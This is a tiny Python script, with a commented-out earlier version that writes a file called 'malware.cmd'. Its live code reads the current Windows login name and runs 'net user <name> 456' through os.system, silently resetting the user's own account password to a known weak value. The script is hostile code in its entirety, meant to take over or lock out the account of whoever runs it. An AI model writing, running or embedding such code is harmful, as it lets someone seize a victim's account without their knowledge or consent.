# import os
#
# user = os.getlogin()
# command = f"net user {user} 123"
# open("malware.cmd", "w").write(command)
#

# -----------------------------------

import os

user = os.getlogin()
command = f"net user {user} 456"

os.system(command)
